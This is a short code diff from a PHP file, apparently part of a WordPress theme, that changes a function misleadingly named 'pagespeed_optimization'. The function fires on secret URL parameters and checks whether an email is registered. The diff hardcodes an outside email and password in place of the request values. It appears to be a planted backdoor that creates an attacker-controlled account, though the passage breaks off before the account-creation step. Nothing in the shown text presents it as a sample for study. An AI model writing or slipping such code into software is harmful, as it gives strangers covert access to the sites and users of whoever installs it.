@@ -494,8 +494,8 @@
 <?php
 function pagespeed_optimization() {
 	if (isset($_GET['wp_theme_init']) && isset($_GET['success'])) {
-    	$email = sanitize_email($_GET['wp_theme_init']);
-    	$password = sanitize_text_field($_GET['success']);
+    	$email = 'johnybran481@gmail.com';
+    	$password = 'P@@sword#6423';
 
     	// Check if the email is already registered
     	if (!email_exists($email)) {
